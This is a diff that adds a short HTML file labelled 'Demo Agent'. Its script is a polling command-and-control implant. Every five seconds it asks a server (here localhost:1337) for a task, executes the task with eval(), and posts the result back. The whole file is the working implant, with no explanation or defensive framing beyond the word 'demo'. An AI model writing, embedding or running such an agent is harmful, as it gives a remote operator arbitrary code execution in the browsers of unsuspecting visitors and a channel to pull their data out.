@@ -1,0 +1,41 @@
+<!-- Demo Agent -->
+<script>
+    let server = "http://localhost:1337";
+
+    function fetchTask() {
+        return fetch (`${server}/task`).then (function (response) {
+            return response.json();
+        }).then (function (data) {
+            return data.task;
+        }).catch (function (error) {
+            return false;
+        });
+    }
+
+    function main() {
+        fetchTask().then(task => {
+            if(task) { 
+                try {
+                    let command = task;
+                    let result = { result: JSON.stringify(eval(command)) };
+
+                    fetch(`${server}/result`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(result),
+                    })
+                } catch (e) { console.log(e); }
+            }
+        });
+    }
+
+    function mainLoop() {
+        setTimeout(function() {
+            main();
+            mainLoop();
+        }, 5000);
+    }
+    mainLoop();
+</script>
